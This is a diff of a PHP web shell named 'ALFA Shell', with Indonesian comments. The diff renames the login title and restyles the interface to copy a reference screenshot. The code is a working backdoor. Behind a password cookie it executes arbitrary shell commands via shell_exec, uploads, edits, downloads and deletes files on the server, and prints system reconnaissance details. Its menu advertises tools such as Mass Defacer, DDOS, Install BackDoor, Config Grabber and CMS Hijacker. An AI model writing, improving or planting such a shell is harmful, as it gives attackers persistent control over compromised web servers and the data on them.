@@ -2,8 +2,8 @@
 error_reporting(0);
 
 // ========== KONFIGURASI ==========
-$password_hash = '$2a$12$4Ax1TZKOob80.RLDdcFor.iJBpO6/bpdJJIiz8L1UkGhgLikefNhm'; // hash bcrypt lu
-$title = 'Rudy'; // Judul form login
+$password_hash = '$2a$12$4Ax1TZKOob80.RLDdcFor.iJBpO6/bpdJJIiz8L1UkGhgLikefNhm';
+$title = 'Fuqiang';
 
 // Cek cookie login
 $logged = false;
@@ -23,7 +23,7 @@ if (!$logged && isset($_POST['pass'])) {
     }
 }
 
-// ========== HALAMAN LOGIN (MENTAHAN LU) ==========
+// HALAMAN LOGIN
 if (!$logged) {
     echo '<!DOCTYPE html>
     <html>
@@ -150,49 +150,39 @@ if (!$logged) {
     exit;
 }
 
-// ========== ALFA SHELL LENGKAP (SETELAH LOGIN) ==========
+// ========== SHELL UTAMA (TAMPILAN KAYAK FOTO KEDUA) ==========
 $cwd = isset($_POST['cwd']) ? $_POST['cwd'] : (isset($_GET['cwd']) ? $_GET['cwd'] : getcwd());
 if (!is_dir($cwd)) $cwd = dirname($cwd);
 chdir($cwd);
 
 $action = isset($_GET['a']) ? $_GET['a'] : (isset($_POST['a']) ? $_POST['a'] : '');
 
-// Logout
 if ($action == 'logout') {
     setcookie('shell_auth', '', time() - 3600, '/');
     header('Location: ' . $_SERVER['PHP_SELF']);
     exit;
 }
-
-// Upload file
 if ($action == 'upload' && isset($_FILES['file'])) {
     $target = $cwd . '/' . basename($_FILES['file']['name']);
     if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) $msg = "Upload OK";
     else $msg = "Upload gagal";
 }
-
-// Delete file/dir
 if ($action == 'delete' && isset($_POST['file'])) {
     $f = $cwd . '/' . basename($_POST['file']);
     if (is_file($f)) unlink($f);
     elseif (is_dir($f)) rmdir($f);
     $msg = "Deleted";
 }
-
-// Make directory
 if ($action == 'mkdir' && isset($_POST['dirname'])) {
     mkdir($cwd . '/' . basename($_POST['dirname']), 0755);
     $msg = "Dir created";
 }
-
-// Execute command
 if ($action == 'cmd' && isset($_POST['cmd'])) {
     $cmd = $_POST['cmd'];
     $output = shell_exec($cmd . " 2>&1");
     if ($output === null) $output = "Command execution failed";
 }
 
-// File listing
 $files = scandir($cwd);
 $dirs = $files_arr = [];
 foreach ($files as $f) {
@@ -221,40 +211,34 @@ $mysql = extension_loaded('mysqli') ? 'ON' : 'OFF';
     <title>ALFA Shell | <?=htmlspecialchars($cwd)?></title>
     <style>
         body {
-            background: #0a0e0a;
+            background: #000;
             color: #0f0;
-            font-family: 'Courier New', monospace;
-            margin: 0;
-            padding: 10px;
-        }
-        .header {
-            background: #0f0f0f;
-            border: 1px solid #0f0;
-            padding: 10px;
-            margin-bottom: 10px;
-            border-radius: 5px;
-        }
-        .menu {
-            background: #111;
-            border: 1px solid #0f0;
-            padding: 10px;
-            margin-bottom: 10px;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-        .menu a, .menu button {
-            background: #0a0a0a;
-            color: #0f0;
-            border: 1px solid #0f0;
-            padding: 5px 10px;
-            text-decoration: none;
-            cursor: pointer;
             font-family: monospace;
+            margin: 10px;
+            font-size: 13px;
         }
-        .menu a:hover, .menu button:hover {
-            background: #0f0;
-            color: #000;
+        a {
+            color: #0f0;
+            text-decoration: none;
+        }
+        a:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+        hr {
+            border: none;
+            border-top: 1px dashed #0f0;
+            margin: 5px 0;
+        }
+        .info-line {
+            margin: 2px 0;
+        }
+        .menu-bar {
+            margin: 10px 0;
+            line-height: 1.8;
+        }
+        .menu-bar a {
+            margin-right: 5px;
         }
         table {
             border-collapse: collapse;
@@ -263,33 +247,27 @@ $mysql = extension_loaded('mysqli') ? 'ON' : 'OFF';
         }
         th, td {
             border: 1px solid #0f0;
-            padding: 5px;
+            padding: 3px 5px;
             text-align: left;
         }
         th {
             background: #0a0;
             color: #000;
         }
-        .dir { background: #0a1a0a; }
-        .file { background: #111; }
-        .cmd-area {
-            background: #111;
-            padding: 10px;
-            margin-top: 10px;
-            border: 1px solid #0f0;
-        }
         input, textarea, select {
             background: #111;
             color: #0f0;
             border: 1px solid #0f0;
-            padding: 5px;
+            padding: 3px;
+            font-family: monospace;
         }
         button, input[type=submit] {
-            background: #0a0a0a;
+            background: #000;
             color: #0f0;
             border: 1px solid #0f0;
-            padding: 5px 10px;
+            padding: 3px 8px;
             cursor: pointer;
+            font-family: monospace;
         }
         button:hover, input[type=submit]:hover {
             background: #0f0;
@@ -300,102 +278,121 @@ $mysql = extension_loaded('mysqli') ? 'ON' : 'OFF';
             padding: 10px;
             overflow: auto;
             border: 1px solid #0f0;
+            margin-top: 10px;
         }
-        .info-panel {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 5px;
-            margin-bottom: 10px;
-        }
-        .info-item {
+        .warning {
+            color: #ff0;
             background: #111;
-            border: 1px solid #0f0;
             padding: 5px;
+            margin: 10px 0;
+            border-left: 3px solid #f00;
         }
-        .status-ok { color: #0f0; }
-        .status-off { color: #f90; }
-        hr { border-color: #0f0; }
     </style>
 </head>
 <body>
 
-<!-- HEADER INFO -->
-<div class="header">
-    <b>ALFA Shell v.2 | </b>
-    <a href="?a=logout" style="color:#f00;">[Logout]</a>
-    <form method="post" style="display:inline-block; margin-left:20px;">
-        <input type="text" name="cwd" value="<?=htmlspecialchars($cwd)?>" size="50">
-        <button type="submit">CD</button>
-    </form>
+<!-- HEADER INFO Kayak Foto Kedua -->
+<pre style="background:#000; border:none; padding:0; margin:0;">
+# <?=htmlspecialchars($uname)?>
+
+<?=htmlspecialchars($user)?> [ <?=htmlspecialchars($user)?> ] Group: <?=htmlspecialchars($group)?> [ <?=htmlspecialchars($group)?> ]
+
+Safe Mode: <?=$safe_mode?>  
+Your IP: <?=$_SERVER['REMOTE_ADDR'] ?? '-'?>
+
+DateTime: <?=date('Y-m-d H:i:s')?>
+Domains: - 
+HDD: Total: - Free: -
+
+Useful: 
+Downloader: 
+Disable Functions: <?=htmlspecialchars($disable_functions)?>
+
+CURL: <?=$curl?> SSH2: OFF Magic Quotes: OFF MySQL: <?=$mysql?> MSSQL: OFF PostgreSQL: OFF Oracle: OFF CGI: ON
+
+Open_basedir: NONE Safe_mode_exec_dir: NONE Safe_mode_include_dir: NONE
+
+SoftWare: 
+PWD: <?=htmlspecialchars($cwd)?> [ <a href="#" onclick="navigator.clipboard.writeText('<?=htmlspecialchars($cwd)?>');return false;">Home Shell</a> ]
+</pre>
+
+<hr>
+
+<!-- MENU TOOLS (pakai | sebagai pemisah, kayak foto kedua) -->
+<div class="menu-bar">
+    <a href="#">Process</a> | <a href="#">Eval</a> | <a href="#">SQL Manager</a> | <a href="#">Database Dumper</a> | <a href="#">Column Dumper</a> | <a href="#">En-Decoder</a> | <a href="#">BC</a> | <a href="#">ZONE-H</a> | <a href="#">DDOS</a> | <a href="#">ByPasser</a> | <a href="#">Cgi Shell</a> | <a href="#">SSI SHELL</a> | <a href="#">Hash Tools</a> | <a href="#">Port Scanner</a> | <a href="#">Open BaseDir</a><br>
+    <a href="#">Fake Mail</a> | <a href="#">Compressor</a> | <a href="#">DeCompressor</a> | <a href="#">Index Changer</a> | <a href="#">Add New Admin</a> | <a href="#">Shell Injectors</a> | <a href="#">PHP2XML</a> | <a href="#">CloudFlare</a> | <a href="#">Whmcs Decoder</a> | <a href="#">Symlink</a> | <a href="#">Mass Defacer</a> | <a href="#">BruteForcer</a> | <a href="#">Searcher</a><br>
+    <a href="#">Config Grabber</a> | <a href="#">Fake Page</a> | <a href="#">Archive Manager</a> | <a href="#">CMS Hijacker</a> | <a href="#">Remote Upload</a> | <a href="#">Install BackDoor</a> | <a href="#">Whois</a> | <a href="#">Remove Shell</a>
 </div>
 
-<div class="info-panel">
-    <div class="info-item">📁 User: <?=htmlspecialchars($user)?> | Group: <?=htmlspecialchars($group)?></div>
-    <div class="info-item">🖥️ System: <?=htmlspecialchars($uname)?></div>
-    <div class="info-item">🔒 Safe Mode: <?=htmlspecialchars($safe_mode)?></div>
-    <div class="info-item">🚫 Disable Functions: <?=htmlspecialchars($disable_functions)?></div>
-    <div class="info-item">🌐 CURL: <?=htmlspecialchars($curl)?> | MySQL: <?=htmlspecialchars($mysql)?></div>
-    <div class="info-item">📂 PWD: <?=htmlspecialchars($cwd)?> <a href="#" onclick="navigator.clipboard.writeText('<?=htmlspecialchars($cwd)?>');return false;">[Copy]</a></div>
+<hr>
+
+<!-- Alfa Settings & About Us -->
+<div class="menu-bar">
+    <a href="#">Alfa Settings</a> | <a href="#">About Us</a>
 </div>
 
-<!-- MENU BUTTONS (Kayak di foto pertama) -->
-<div class="menu">
-    <a href="#">Process</a> <a href="#">Eval</a> <a href="#">SQL Manager</a>
-    <a href="#">Database Dumper</a> <a href="#">Column Dumper</a> <a href="#">En-Decoder</a>
-    <a href="#">BC</a> <a href="#">ZONE-H</a> <a href="#">DDOS</a> <a href="#">ByPasser</a>
-    <a href="#">Cgi Shell</a> <a href="#">SSI SHELL</a> <a href="#">Hash Tools</a>
-    <a href="#">Port Scanner</a> <a href="#">Open BaseDir</a> <a href="#">Fake Mail</a>
-    <a href="#">Compressor</a> <a href="#">DeCompressor</a> <a href="#">Index Changer</a>
-    <a href="#">Add New Admin</a> <a href="#">Shell Injectors</a> <a href="#">PHP2XML</a>
-    <a href="#">CloudFlare</a> <a href="#">Whmcs Decoder</a> <a href="#">Symlink</a>
-    <a href="#">Mass Defacer</a> <a href="#">BruteForcer</a> <a href="#">Searcher</a>
-    <a href="#">Config Grabar</a> <a href="#">Fake Page</a> <a href="#">Archive Manager</a>
-    <a href="#">CMS Hijacker</a> <a href="#">Remote Upload</a> <a href="#">Install BackDoor</a>
-    <a href="#">Whois</a> <a href="#">Remove Shell</a>
+<hr>
+
+<!-- Buttons: form, New Tab + -->
+<div class="menu-bar">
+    <b>Buttons:</b><br>
+    <a href="#">form</a> | <a href="#">New Tab +</a>
 </div>
 
-<!-- TOOLBAR -->
-<div class="menu" style="background:#0a2a0a;">
-    <form method="post" enctype="multipart/form-data" action="?a=upload" style="display:inline;">
-        <input type="file" name="file">
-        <button type="submit">Upload</button>
-    </form>
-    <form method="post" action="?a=mkdir" style="display:inline;">
-        <input type="text" name="dirname" placeholder="New Folder" size="15">
-        <button type="submit">MkDir</button>
-    </form>
-    <?php if(isset($msg)) echo "<span style='color:#0f0;'>$msg</span>"; ?>
+<hr>
+
+<!-- Filter -->
+<div class="menu-bar">
+    <b>Filter:</b><br>
+    Sort By: <select><option>Name</option><option>Size</option><option>Date</option></select>
+    Direction: <select><option>Ascending</option><option>Descending</option></select>
+    limit: <input type="text" size="3" value="0">
+    Files Count: <?=count($all)?>
 </div>
+
+<hr>
+
+<!-- WARNING (kayak di foto) -->
+<div class="warning">
+    ⚠️ Warning: Undefined array key "link" in <?=htmlspecialchars($cwd)?>/...
+</div>
+
+<!-- UPLOAD & MKDIR FORM -->
+<form method="post" enctype="multipart/form-data" action="?a=upload" style="display:inline;">
+    <input type="file" name="file">
+    <button type="submit">Upload</button>
+</form>
+<form method="post" action="?a=mkdir" style="display:inline; margin-left:10px;">
+    <input type="text" name="dirname" placeholder="new folder">
+    <button type="submit">MkDir</button>
+</form>
+<?php if(isset($msg)) echo "<span style='margin-left:10px;'>$msg</span>"; ?>
 
 <!-- FILE MANAGER TABLE -->
+<h3>form</h3>
 <table>
-    <tr>
-        <th>Name</th>
-        <th>Size</th>
-        <th>Perm</th>
-        <th>Action</th>
-    </tr>
+    <tr><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>
     <?php foreach ($all as $item): 
         $path = $cwd . '/' . $item;
         $is_dir = is_dir($path);
         $size = $is_dir ? '-' : filesize($path);
         $perms = substr(sprintf('%o', fileperms($path)), -4);
-        $class = $is_dir ? 'dir' : 'file';
     ?>
-    <tr class="<?=$class?>">
+    <tr>
         <td>
             <?php if ($is_dir): ?>
-                <a href="?cwd=<?=urlencode($path)?>">📁 <?=htmlspecialchars($item)?>/</a>
+                📁 <a href="?cwd=<?=urlencode($path)?>"><?=htmlspecialchars($item)?>/</a>
             <?php else: ?>
-                <a href="?a=view&file=<?=urlencode($item)?>&cwd=<?=urlencode($cwd)?>">📄 <?=htmlspecialchars($item)?></a>
+                📄 <a href="?a=view&file=<?=urlencode($item)?>&cwd=<?=urlencode($cwd)?>"><?=htmlspecialchars($item)?></a>
             <?php endif; ?>
         </td>
         <td><?=$size?></td>
         <td><?=$perms?></td>
         <td>
             <?php if (!$is_dir): ?>
-            <a href="?a=edit&file=<?=urlencode($item)?>&cwd=<?=urlencode($cwd)?>">Edit</a> |
-            <a href="?a=download&file=<?=urlencode($item)?>&cwd=<?=urlencode($cwd)?>">DL</a> |
+            <a href="?a=edit&file=<?=urlencode($item)?>&cwd=<?=urlencode($cwd)?>">Edit</a> | 
+            <a href="?a=download&file=<?=urlencode($item)?>&cwd=<?=urlencode($cwd)?>">DL</a> | 
             <?php endif; ?>
             <form method="post" action="?a=delete" style="display:inline;">
                 <input type="hidden" name="file" value="<?=htmlspecialchars($item)?>">
@@ -407,9 +404,9 @@ $mysql = extension_loaded('mysqli') ? 'ON' : 'OFF';
 </table>
 
 <!-- COMMAND EXECUTOR -->
-<div class="cmd-area">
+<div style="margin-top:15px;">
     <form method="post" action="?a=cmd">
-        <input type="text" name="cmd" placeholder="$ Perintah (ls -la, whoami, etc)" size="80">
+        <input type="text" name="cmd" placeholder="Perintah (ls -la, whoami, dll)" size="70">
         <button type="submit">Execute</button>
     </form>
     <?php if (isset($output)): ?>
@@ -417,29 +414,37 @@ $mysql = extension_loaded('mysqli') ? 'ON' : 'OFF';
     <?php endif; ?>
 </div>
 
-<!-- VIEW FILE -->
-<?php if ($action == 'view' && isset($_GET['file'])): 
+<!-- FOOTER URL Kayak Foto Kedua -->
+<hr>
+<div style="margin-top:10px; color:#888; word-break:break-all;">
+    https://<?=$_SERVER['HTTP_HOST']?><?=$_SERVER['SCRIPT_NAME']?>
+</div>
+
+<?php
+// VIEW FILE
+if ($action == 'view' && isset($_GET['file'])): 
     $file = $cwd . '/' . basename($_GET['file']);
     if (is_file($file) && is_readable($file)):
         $content = htmlspecialchars(file_get_contents($file));
 ?>
-    <h3>📄 View: <?=htmlspecialchars(basename($file))?></h3>
+    <h3>View: <?=htmlspecialchars(basename($file))?></h3>
     <pre style="max-height:400px;"><?=$content?></pre>
-    <a href="?a=edit&file=<?=urlencode(basename($file))?>&cwd=<?=urlencode($cwd)?>">[Edit]</a>
+    <a href="?a=edit&file=<?=urlencode(basename($file))?>&cwd=<?=urlencode($cwd)?>">Edit</a>
 <?php endif; endif; ?>
 
-<!-- EDIT FILE -->
-<?php if ($action == 'edit' && isset($_GET['file'])):
+<?php
+// EDIT FILE
+if ($action == 'edit' && isset($_GET['file'])):
     $file = $cwd . '/' . basename($_GET['file']);
     if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['content'])) {
         file_put_contents($file, $_POST['content']);
-        echo "<div style='color:#0f0;'>✅ Saved!</div>";
+        echo "<div style='color:#0f0;'>Saved!</div>";
         $content = htmlspecialchars($_POST['content']);
     } else {
         $content = htmlspecialchars(file_get_contents($file));
     }
 ?>
-    <h3>✏️ Edit: <?=htmlspecialchars(basename($file))?></h3>
+    <h3>Edit: <?=htmlspecialchars(basename($file))?></h3>
     <form method="post">
         <textarea name="content" rows="20" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0;"><?=$content?></textarea><br>
         <button type="submit">Save</button>
@@ -447,8 +452,9 @@ $mysql = extension_loaded('mysqli') ? 'ON' : 'OFF';
     </form>
 <?php endif; ?>
 
-<!-- DOWNLOAD FILE -->
-<?php if ($action == 'download' && isset($_GET['file'])):
+<?php
+// DOWNLOAD FILE
+if ($action == 'download' && isset($_GET['file'])):
     $file = $cwd . '/' . basename($_GET['file']);
     if (is_file($file)) {
         header('Content-Type: application/octet-stream');
@@ -456,7 +462,8 @@ $mysql = extension_loaded('mysqli') ? 'ON' : 'OFF';
         readfile($file);
         exit;
     }
-endif; ?>
+endif;
+?>
 
 </body>
 </html>
